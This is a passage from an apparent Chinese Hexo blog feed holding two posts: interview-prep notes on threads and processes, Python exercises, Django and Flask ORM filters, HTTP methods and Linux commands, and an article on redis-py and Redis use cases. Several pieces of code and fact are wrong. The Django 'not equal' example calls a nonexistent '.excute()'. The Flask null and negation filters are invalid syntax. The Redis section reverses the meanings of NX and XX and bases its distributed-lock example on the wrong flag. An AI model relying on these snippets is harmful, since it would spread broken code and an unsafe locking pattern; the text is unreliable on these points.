title="另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。"></a>另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。</h4><h4 id="线程在执行过程中与进程还是有区别的。每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。但是线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制。"><a href="#线程在执行过程中与进程还是有区别的。每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。但是线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制。" class="headerlink" title="线程在执行过程中与进程还是有区别的。每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。但是线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制。"></a>线程在执行过程中与进程还是有区别的。每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。<strong>但是线程不能够独立执行，</strong>必须依存在应用程序中，由应用程序提供多个线程执行控制。</h4><h4 id="从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配。这就是进程和线程的重要区别。"><a href="#从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配。这就是进程和线程的重要区别。" class="headerlink" title="从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配。这就是进程和线程的重要区别。"></a>从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配。<strong>这就是进程和线程的重要区别。</strong></h4><h3 id="下面的程序-会是什么情况？答案会报参数错误。"><a href="#下面的程序-会是什么情况？答案会报参数错误。" class="headerlink" title="下面的程序 会是什么情况？答案会报参数错误。"></a>下面的程序 会是什么情况？答案会报参数错误。</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self,a)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span><span class="params">(A)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self,a,b)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line">B().run(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>因为B重写了run方法，所以run应该有两个参数</p><h3 id="ORM常用筛选条件"><a href="#ORM常用筛选条件" class="headerlink" title="ORM常用筛选条件"></a>ORM常用筛选条件</h3><h4 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h4><h5 id="大于、大于等于"><a href="#大于、大于等于" class="headerlink" title="大于、大于等于"></a>大于、大于等于</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__gt  大于</span><br><span class="line">__gte  大于等于</span><br><span class="line"></span><br><span class="line">User.objects.filter(age__gt=<span class="number">10</span>)    // 查询年龄大于<span class="number">10</span>岁的用户</span><br><span class="line">User.objects.filter(age__gte=<span class="number">10</span>)  // 查询年龄大于等于<span class="number">10</span>岁的用户</span><br></pre></td></tr></table></figure><h5 id="小于、小于等于"><a href="#小于、小于等于" class="headerlink" title="小于、小于等于"></a>小于、小于等于</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__lt  小于</span><br><span class="line">__lte 小于等于</span><br><span class="line"></span><br><span class="line">User.objects.filter(age__lt=<span class="number">10</span>)     // 查询年龄小于<span class="number">10</span>岁的用户</span><br><span class="line">User.objects.filter(age__lte=<span class="number">10</span>)   // 查询年龄小于等于<span class="number">10</span>岁的用户</span><br></pre></td></tr></table></figure><h5 id="in"><a href="#in" class="headerlink" title="in"></a>in</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__in</span><br><span class="line">查询年龄在某一范围的用户</span><br><span class="line">User.objects.filter(age__in=[<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>])</span><br></pre></td></tr></table></figure><h5 id="like"><a href="#like" class="headerlink" title="like"></a>like</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__exact        精确等于 like <span class="string">'aaa'</span></span><br><span class="line">__iexact       精确等于 忽略大小写 ilike <span class="string">'aaa'</span></span><br><span class="line">__contains     包含 like <span class="string">'%aaa%'</span></span><br><span class="line">__icontains    包含 忽略大小写 ilike <span class="string">'%aaa%'</span>，但是对于sqlite来说，contains的作用效果等同于icontains。</span><br></pre></td></tr></table></figure><h5 id="is-null-is-not-null"><a href="#is-null-is-not-null" class="headerlink" title="is null / is not null"></a>is null / is not null</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__isnull  判空</span><br><span class="line"></span><br><span class="line">User.objects.filter(username__isnull=<span class="keyword">True</span>)    // 查询用户名为空的用户</span><br><span class="line">User.objects.filter(username__isnull=<span class="keyword">False</span>)  // 查询用户名不为空的用户</span><br></pre></td></tr></table></figure><h5 id="不等于-不包含于"><a href="#不等于-不包含于" class="headerlink" title="不等于/不包含于"></a>不等于/不包含于</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User.objects.filter().excute(age=<span class="number">10</span>)    // 查询年龄不为<span class="number">10</span>的用户</span><br><span class="line">User.objects.filter().excute(age__in=[<span class="number">10</span>, <span class="number">20</span>])  // 查询年龄不为在 [<span class="number">10</span>, <span class="number">20</span>] 的用户</span><br></pre></td></tr></table></figure><h4 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h4><h5 id="大于、大于等于-1"><a href="#大于、大于等于-1" class="headerlink" title="大于、大于等于"></a>大于、大于等于</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">User.query.filter(User.age &gt; <span class="number">10</span>)    // 查询年龄大于<span class="number">10</span>岁的用户</span><br><span class="line">User.query.filter(User.age &gt;= <span class="number">10</span>)  // 查询年龄大于等于<span class="number">10</span>岁的用户</span><br></pre></td></tr></table></figure><h5 id="小于、小于等于-1"><a href="#小于、小于等于-1" class="headerlink" title="小于、小于等于"></a>小于、小于等于</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">User.query.filter(User.age &lt; <span class="number">10</span>)     // 查询年龄小于<span class="number">10</span>岁的用户</span><br><span class="line">User.query.filter(User.age &lt;= <span class="number">10</span>)   // 查询年龄小于等于<span class="number">10</span>岁的用户</span><br></pre></td></tr></table></figure><h5 id="in-1"><a href="#in-1" class="headerlink" title="in"></a>in</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询年龄在某一范围的用户</span><br><span class="line">User.query.filter(User.age.in_([<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>]))</span><br></pre></td></tr></table></figure><h5 id="like-1"><a href="#like-1" class="headerlink" title="like"></a>like</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User.query.filter(User.name.like(<span class="string">'%wu%'</span>))</span><br></pre></td></tr></table></figure><h5 id="is-null-is-not-null-1"><a href="#is-null-is-not-null-1" class="headerlink" title="is null / is not null"></a>is null / is not null</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">User.query.filter(User.username = <span class="keyword">None</span> )    // 查询用户名为空的用户</span><br><span class="line">User.query.filter(User.username != <span class="keyword">None</span> )  // 查询用户名不为空的用户</span><br></pre></td></tr></table></figure><h5 id="不等于-不包含于-1"><a href="#不等于-不包含于-1" class="headerlink" title="不等于/不包含于"></a>不等于/不包含于</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User.query.filter(~(User.age=<span class="number">10</span>))    // 查询年龄不为<span class="number">10</span>的用户</span><br><span class="line">User.objects.filter(~(User.age.in_([<span class="number">10</span>,<span class="number">20</span>])))  // 查询年龄不为在 [<span class="number">10</span>, <span class="number">20</span>] 的用户</span><br></pre></td></tr></table></figure><h3 id="put与post的区别"><a href="#put与post的区别" class="headerlink" title="put与post的区别?"></a>put与post的区别?</h3><p>POST<br>用于提交请求，可以更新或者创建资源，是非幂等的<br>举个例子，在我们的支付系统中，一个api的功能是创建收款金额二维码，它和金额相关，每个用户可以有多个二维码，如果连续调用则会创建新的二维码，这个时候就用POST</p><hr><p>PUT<br>用于向指定的URI传送更新资源，是幂等的<br>还是那个例子，用户的账户二维码只和用户关联，而且是一一对应的关系，此时这个api就可以用PUT，因为每次调用它，都将刷新用户账户二维码</p><h3 id="http有几种方式"><a href="#http有几种方式" class="headerlink" title="http有几种方式?"></a>http有几种方式?</h3><p>OPTIONS：返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送的请求来测试服务器的功能性。</p><p>HEAD：向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。</p><p>GET：向特定的资源发出请求。</p><p>POST：向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的创建和/或已有资源的修改。</p><p>PUT：向指定资源位置上传其最新内容。</p><p>DELETE：请求服务器删除Request-URI所标识的资源。</p><p>TRACE：回显服务器收到的请求，主要用于测试或诊断。</p><p>CONNECT：HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。</p><h3 id="解释下面linux命令的含义"><a href="#解释下面linux命令的含义" class="headerlink" title="解释下面linux命令的含义"></a>解释下面linux命令的含义</h3><p><em>cat:</em> 常用来显示文件内容，或者将几个文件连接起来显示，或者从标准输入读取内容并显示，它常与重定向符号配合使用。<br><em>rsync:</em> 更快更好地远程拷贝文件<br><em>rm:</em> 删除文件或目录<br><em>grep:</em> 在一个或多个文件中搜索字符串模板<br><em>tcpdump:</em> 是一个运行在命令行下的抓包工具<br><em>strace:</em> 常用来跟踪进程执行时的系统调用和所接收的信号<br><em>chmod:</em> 修改文件权限<br><em>less:</em> 对文件或其它输出进行分页显示的工具，可向前向后翻页，而more只能向后翻页<br><em>netstat:</em> 用于列出系统上所有的网络套接字连接情况，包括 tcp, udp 以及 unix 套接字，另外它还能列出处于监听状态（即等待接入请求）的套接字<br><em>top:</em> 实时显示系统中各个进程的资源占用状况<br><em>telnet:</em> 远程登录<br><em>scp:</em> linux系统下基于ssh登陆进行安全的远程文件拷贝命令</p><h3 id="用最简洁的代码，将元素类型为int的list中大于100的元素输出到另一个list-并将后一个list中的元素从大到小排序"><a href="#用最简洁的代码，将元素类型为int的list中大于100的元素输出到另一个list-并将后一个list中的元素从大到小排序" class="headerlink" title="用最简洁的代码，将元素类型为int的list中大于100的元素输出到另一个list,并将后一个list中的元素从大到小排序"></a>用最简洁的代码，将元素类型为int的list中大于100的元素输出到另一个list,并将后一个list中的元素从大到小排序</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">lstA = random.sample(range(<span class="number">1000</span>), <span class="number">100</span>)</span><br><span class="line">lstB = list(filter(<span class="keyword">lambda</span> x: x &gt; <span class="number">100</span>, lstA))</span><br><span class="line">lstB.sort(reverse=<span class="keyword">True</span>)</span><br><span class="line">print(lstB)</span><br></pre></td></tr></table></figure><h3 id="给两个排好序的数组，找出重复的元素"><a href="#给两个排好序的数组，找出重复的元素" class="headerlink" title="给两个排好序的数组，找出重复的元素"></a>给两个排好序的数组，找出重复的元素</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">lstA = [<span class="number">1</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">16</span>,<span class="number">25</span>,<span class="number">28</span>,<span class="number">39</span>]<span class="comment"># random.sample(range(1 &lt;&lt; 15), 1011)</span></span><br><span class="line">lstB = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">16</span>,<span class="number">21</span>,<span class="number">25</span>,<span class="number">28</span>]<span class="comment"># random.sample(range(1 &lt;&lt; 15), 2030)</span></span><br><span class="line"><span class="comment"># lstA.sort()</span></span><br><span class="line"><span class="comment"># lstB.sort()</span></span><br><span class="line"></span><br><span class="line">lenA = len(lstA)</span><br><span class="line">lenB = len(lstB)</span><br><span class="line">common = []</span><br><span class="line">i, j = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i &lt; lenA <span class="keyword">and</span> j &lt; lenB:</span><br><span class="line">    <span class="keyword">if</span> lstA[i] &lt; lstB[j]:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> lstA[i] &gt; lstB[j]:</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        common.append(lstA[i])</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(common)</span><br></pre></td></tr></table></figure><h3 id="给一个字符串，输出它的所有排列"><a href="#给一个字符串，输出它的所有排列" class="headerlink" title="给一个字符串，输出它的所有排列"></a>给一个字符串，输出它的所有排列</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arrangement</span><span class="params">(lst, length, index=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> index == length - <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">''</span>.join(lst))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> range(index, length):</span><br><span class="line">        lst[pos], lst[index] = lst[index], lst[pos]</span><br><span class="line">        arrangement(lst, length, index + <span class="number">1</span>)</span><br><span class="line">        lst[pos], lst[index] = lst[index], lst[pos]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_arrangement</span><span class="params">(iterable)</span>:</span></span><br><span class="line">    lst = list(iterable)</span><br><span class="line">    arrangement(lst, len(lst))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start_arrangement(<span class="string">'abcd'</span>)</span><br></pre></td></tr></table></figure><h3 id="Python基础题"><a href="#Python基础题" class="headerlink" title="Python基础题"></a>Python基础题</h3><p>写了一些题目。但是deploy时hexo报错,网上说是hexo模板的问题,有些特殊符号没正确处理。但是尝试了没解决<br>…后面找到原因再补充…</p><h3 id="Python进阶题"><a href="#Python进阶题" class="headerlink" title="Python进阶题"></a>Python进阶题</h3>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;学习别人的，渐渐成为自己的&lt;/blockquote&gt;

&lt;blockquote&gt;
&lt;p&gt;搜集一些别人的面试题,为自己的面试做些准备。以后逐渐添加面试题&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="面试题" scheme="http://longofo.cc/categories/%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
    
      <category term="python" scheme="http://longofo.cc/tags/python/"/>
    
      <category term="面试题" scheme="http://longofo.cc/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>用python操作redis及redis的一些应用场景</title>
    <link href="http://longofo.cc/%E7%94%A8python%E6%93%8D%E4%BD%9Credis%E5%8F%8Aredis%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF.html"/>
    <id>http://longofo.cc/用python操作redis及redis的一些应用场景.html</id>
    <published>2018-04-30T07:06:43.000Z</published>
    <updated>2020-07-30T13:31:28.271Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">想要体面生活,就得奋力拼搏</blockquote><blockquote><p>搜集了网上的一些资料并整理，方便以后学习和查询<br><img src="http://p5m1dtoh7.bkt.clouddn.com/%E7%94%A8python%E6%93%8D%E4%BD%9Credis%E5%8F%8Aredis%E7%9A%84%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/redis_1.jpg" alt=""></p></blockquote><a id="more"></a><h2 id="redis简介"><a href="#redis简介" class="headerlink" title="redis简介"></a>redis简介</h2><p>redis是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set –有序集合)和hash（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步</p><h2 id="redis安装"><a href="#redis安装" class="headerlink" title="redis安装"></a>redis安装</h2><p>网上很多windows、Linux的安装教程，可根据自己的需要寻找对应教程安装</p><h2 id="redis-py安装"><a href="#redis-py安装" class="headerlink" title="redis-py安装"></a>redis-py安装</h2><p><code>pip install redis</code></p><h2 id="redis可视化工具"><a href="#redis可视化工具" class="headerlink" title="redis可视化工具"></a>redis可视化工具</h2><p>RedisDesktopManager<br>下载地址: <a href="https://redisdesktop.com/download" target="_blank" rel="noopener">https://redisdesktop.com/download</a></p><h2 id="API的使用"><a href="#API的使用" class="headerlink" title="API的使用"></a>API的使用</h2><p>redis-py 的API的使用可以分类为：</p><ul><li>连接方式<ul><li>直接连接</li><li>连接池</li></ul></li><li>操作<ul><li>String 操作</li><li>Hash 操作</li><li>List 操作</li><li>Set 操作</li><li>Sort Set 操作</li></ul></li><li>管道</li><li>发布订阅</li></ul><h2 id="连接方式"><a href="#连接方式" class="headerlink" title="连接方式"></a>连接方式</h2><h3 id="操作模式"><a href="#操作模式" class="headerlink" title="操作模式"></a>操作模式</h3><p>redis-py提供两个类Redis和StrictRedis用于实现Redis的命令，StrictRedis用于实现大部分官方的命令，并使用官方的语法和命令，Redis是StrictRedis的子类，用于向后兼容旧版本的redis-py。官方推荐使用StrictRedis方法<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> redis</span><br><span class="line">r = redis.StrictRedis(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">6379</span>, db=<span class="number">0</span>) r.set(<span class="string">'name'</span>, <span class="string">'longofo'</span>)</span><br><span class="line">r.get(<span class="string">'name'</span>)</span><br></pre></td></tr></table></figure></p><h3 id="连接池"><a href="#连接池" class="headerlink" title="连接池"></a>连接池</h3><p>redis-py使用connection pool来管理对一个redis server的所有连接，避免每次建立、释放连接的开销。默认，每个Redis实例都会维护一个自己的连接池。可以直接建立一个连接池，然后作为参数Redis，这样就可以实现多个Redis实例共享一个连接池</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> redis  </span><br><span class="line">pool = redis.ConnectionPool(host=<span class="string">'10.211.55.4'</span>, port=<span class="number">6379</span>,db=<span class="number">0</span>)  </span><br><span class="line">r = redis.StrictRedis(connection_pool=pool)  </span><br><span class="line">r.set(<span class="string">'aaa'</span>, <span class="string">'longe'</span>)  </span><br><span class="line"><span class="keyword">print</span> r.get(<span class="string">'aaa'</span>)</span><br></pre></td></tr></table></figure><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>可以参考<a href="https://docs.lvrui.io/2016/07/24/Python%E6%93%8D%E4%BD%9Credis%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">https://docs.lvrui.io/2016/07/24/Python%E6%93%8D%E4%BD%9Credis%E8%AF%A6%E8%A7%A3/</a><br>写的很详细</p><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><h3 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h3><p>作为<code>Key-Value</code>形态的内存数据库，Redis 最先会被想到的应用场景便是作为数据缓存。而使用 Redis 缓存数据非常简单，只需要通过<code>string</code>类型将序列化后的对象存起来即可，不过也有一些需要注意的地方：</p><ul><li>必须保证不同对象的 key 不会重复，并且使 key 尽量短，一般使用类名（表名）加主键拼接而成。</li><li>选择一个优秀的序列化方式也很重要，目的是提高序列化的效率和减少内存占用。</li><li>缓存内容与数据库的一致性，这里一般有两种做法：<ol><li>只在数据库查询后将对象放入缓存，如果对象发生了修改或删除操作，直接清除对应缓存（或设为过期）。</li><li>在数据库新增和查询后将对象放入缓存，修改后更新缓存，删除后清除对应缓存（或设为过期）。</li></ol></li></ul><h3 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h3><p>Redis 中<code>list</code>的数据结构实现是双向链表，所以可以非常便捷的应用于消息队列（生产者 / 消费者模型）。消息的生产者只需要通过<code>lpush</code>将消息放入 list，消费者便可以通过<code>rpop</code>取出该消息，并且可以保证消息的有序性。如果需要实现带有优先级的消息队列也可以选择<code>sorted set</code>。而<code>pub/sub</code>功能也可以用作发布者 / 订阅者模型的消息。无论使用何种方式，由于 Redis 拥有持久化功能，也不需要担心由于服务器故障导致消息丢失的情况。</p><h3 id="时间轴（Timeline）"><a href="#时间轴（Timeline）" class="headerlink" title="时间轴（Timeline）"></a>时间轴（Timeline）</h3><p><code>list</code>作为双向链表，不光可以作为队列使用。如果将它用作栈便可以成为一个公用的时间轴。当用户发完微博后，都通过<code>lpush</code>将它存放在一个 key 为<code>LATEST_WEIBO</code>的<code>list</code>中，之后便可以通过<code>lrange</code>取出当前最新的微博。</p><h3 id="排行榜"><a href="#排行榜" class="headerlink" title="排行榜"></a>排行榜</h3><p>使用<code>sorted set</code>和一个计算热度的算法便可以轻松打造一个热度排行榜，<code>zrevrangebyscore</code>可以得到以分数倒序排列的序列，<code>zrank</code>可以得到一个成员在该排行榜的位置（是分数正序排列时的位置，如果要获取倒序排列时的位置需要用<code>zcard</code>-<code>zrank</code>）。</p><h3 id="计数器"><a href="#计数器" class="headerlink" title="计数器"></a>计数器</h3><p>计数功能应该是最适合 Redis 的使用场景之一了，因为它高频率读写的特征可以完全发挥 Redis 作为内存数据库的高效。在 Redis 的数据结构中，<code>string</code>、<code>hash</code>和<code>sorted set</code>都提供了<code>incr</code>方法用于原子性的自增操作，下面举例说明一下它们各自的使用场景：</p><ul><li>如果应用需要显示每天的注册用户数，便可以使用<code>string</code>作为计数器，设定一个名为<code>REGISTERED_COUNT_TODAY</code>的 key，并在初始化时给它设置一个到凌晨 0 点的过期时间，每当用户注册成功后便使用<code>incr</code>命令使该 key 增长 1，同时当每天凌晨 0 点后，这个计数器都会因为 key 过期使值清零。</li><li>每条微博都有点赞数、评论数、转发数和浏览数四条属性，这时用<code>hash</code>进行计数会更好，将该计数器的 key 设为<code>weibo:weibo_id</code>，<code>hash</code>的 field 为<code>like_number</code>、<code>comment_number</code>、<code>forward_number</code>和<code>view_number</code>，在对应操作后通过<code>hincrby</code>使<code>hash 中</code>的 field 自增。</li><li>如果应用有一个发帖排行榜的功能，便选择<code>sorted set</code>吧，将集合的 key 设为<code>POST_RANK</code>。当用户发帖后，使用<code>zincrby</code>将该用户 id 的 score 增长 1。<code>sorted set</code>会重新进行排序，用户所在排行榜的位置也就会得到实时的更新。</li></ul><h3 id="好友关系"><a href="#好友关系" class="headerlink" title="好友关系"></a>好友关系</h3><p>这个场景最开始是是一篇介绍微博 Redis 应用的 PPT 中看到的，其中提到微博的 Redis 主要是用在在计数和好友关系两方面上，当时对好友关系方面的用法不太了解，后来看到《Redis 设计与实现》中介绍到作者最开始去使用 Redis 便是希望能通过<code>set</code>解决传统数据库无法快速计算集合中交集这个功能。后来联想到微博当前的业务场景，确实能够以这种方式实现，所以姑且猜测一下：</p><p>对于一个用户 A，将它的关注和粉丝的用户 id 都存放在两个 set 中：</p><ul><li><code>A:follow</code>：存放 A 所有关注的用户 id</li><li><p><code>A:follower</code>：存放 A 所有粉丝的用户 id</p><p>那么通过<code>sinter</code>命令便可以根据<code>A:follow</code>和<code>A:follower</code>的交集得到与 A 互相关注的用户。当 A 进入另一个用户 B 的主页后，<code>A:follow</code>和<code>B:follow</code>的交集便是 A 和 B 的共同专注，<code>A:follow</code>和<code>B:follower</code>的交集便是 A 关注的人也关注了 B。</p></li></ul><h3 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h3><p>在 Redis 2.6.12 版本开始，<code>string</code>的<code>set</code>命令增加了三个参数：</p><ul><li><code>EX</code>：设置键的过期时间（单位为秒）</li><li><code>PX</code>：设置键的过期时间（单位为毫秒）</li><li><p><code>NX</code>  |  <code>XX</code>：当设置为<code>NX</code>时，仅当 key 存在时才进行操作，设置为<code>XX</code>时，仅当 key 不存在才会进行操作</p><p>由于这个操作是原子性的，可以简单地以此实现一个分布式的锁，例如：</p></li></ul><p><code>set key &quot;lock&quot; EX 1 XX</code></p><p>如果这个操作返回<code>false</code>，说明 key 的添加不成功，也就是当前有人在占用这把锁。而如果返回<code>true</code>，则说明得了锁，便可以继续进行操作，并且在操作后通过<code>del</code>命令释放掉锁。并且即使程序因为某些原因并没有释放锁，由于设置了过期时间，该锁也会在 1 秒后自动释放，不会影响到其他程序的运行。</p><h3 id="倒排索引"><a href="#倒排索引" class="headerlink" title="倒排索引"></a>倒排索引</h3><p>倒排索引是构造搜索功能的最常见方式，在 Redis 中也可以通过<code>set</code>进行建立倒排索引，这里以简单的拼音 + 前缀搜索城市功能举例：</p><p>假设一个城市<code>北京</code>，通过拼音词库将<code>北京</code>转为<code>beijing</code>，再通过前缀分词将这两个词分为若干个前缀索引，有：<code>北</code>、<code>北京</code>、<code>b</code>、<code>be</code>…<code>beijin</code>和<code>beijing</code>。将这些索引分别作为<code>set</code>的 key（例如:<code>index:北</code>）并存储<code>北京</code>的 id，倒排索引便建立好了。接下来只需要在搜索时通过关键词取出对应的<code>set</code>并得到其中的 id 即可。</p><p>关于倒排索引可以查看<a href="https://blog.csdn.net/u011239443/article/details/60604017" target="_blank" rel="noopener">https://blog.csdn.net/u011239443/article/details/60604017</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;想要体面生活,就得奋力拼搏&lt;/blockquote&gt;

&lt;blockquote&gt;
&lt;p&gt;搜集了网上的一些资料并整理，方便以后学习和查询&lt;br&gt;&lt;img src=&quot;http://p5m1dtoh7.bkt.clouddn.com/%E7%94%A8python%E6%93%8D%E4%BD%9Credis%E5%8F%8Aredis%E7%9A%84%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/redis_1.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="redis" scheme="http://longofo.cc/categories/redis/"/>
    
    
      <category term="python" scheme="http://longofo.cc/tags/python/"/>
    
      <category term="redis" scheme="http://longofo.cc/tags/redis/"/>
    
  </entry>
  
</feed>
